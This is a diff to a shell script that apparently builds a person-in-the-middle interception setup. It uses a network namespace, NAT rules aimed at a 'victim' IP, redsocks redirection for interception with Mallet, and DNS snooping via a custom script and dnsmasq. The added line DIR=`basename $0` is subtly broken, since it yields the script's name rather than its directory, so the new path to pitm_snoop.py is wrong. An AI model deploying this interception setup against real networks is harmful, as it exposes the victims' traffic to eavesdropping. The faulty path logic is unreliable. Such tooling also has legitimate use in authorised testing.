@@ -36,8 +36,11 @@ if [ "`ip netns identify $PID`" != "pitm" ] ; then
 
 	# Now re-exec the script inside the 'pitm' namespace
 	ip netns exec pitm screen -d -m -S pitm
-	exec screen -S pitm -X screen -t "slimjim" $0 $8
+	screen -S pitm -X screen -t "slimjim" $0 $8
+	exec screen -R -D -S pitm
 fi
+
+DIR=`basename $0`
 
 # make sure iptables is called at various levels
 modprobe br_netfilter
@@ -137,6 +140,9 @@ iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip} ! -d $victim_ip -j SNAT --
 # iptables -t nat -I POSTROUTING -p tcp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:27000-32000
 # iptables -t nat -I POSTROUTING -p udp -s ${br_dev_ip}   -d $victim_ip -j SNAT --to $router_ip:27000-32000
 
+# redsocks is useful for intercepting traffic going to or from the victim
+screen -S pitm -X screen -t "redsocks" redsocks -c /etc/redsocks.conf
+
 # optional: Direct any traffic from the victim to hit redsocks, for interception by Mallet, etc
 # create a custom chain
 iptables -t nat -X REDSOCKS 2> /dev/null
@@ -155,7 +161,10 @@ screen -S pitm -X screen -t "iftop" /usr/sbin/iftop -npNP -i pitm
 # hostsdir/hostname, as well as updating /tmp/pitm/resolv.conf with
 # ip addresses of observed name servers
 mkdir -p /tmp/pitm/hostsdir
-screen -S pitm -X screen -t "pitm_snoop" /root/pitm_snoop.py
+screen -S pitm -X screen -t "pitm_snoop" ${DIR}/pitm_snoop.py
 
 # dnsmasq can make the observed DNS queries available without any extra network traffic
 screen -S pitm -X screen -t "dnsmasq" /usr/sbin/dnsmasq --no-daemon --no-resolv -z -i lo --hostsdir=/tmp/pitm/hostsdir --bogus-priv
+
+echo "Press Ctrl-C to close this window"
+while sleep 1 ; do : ; done
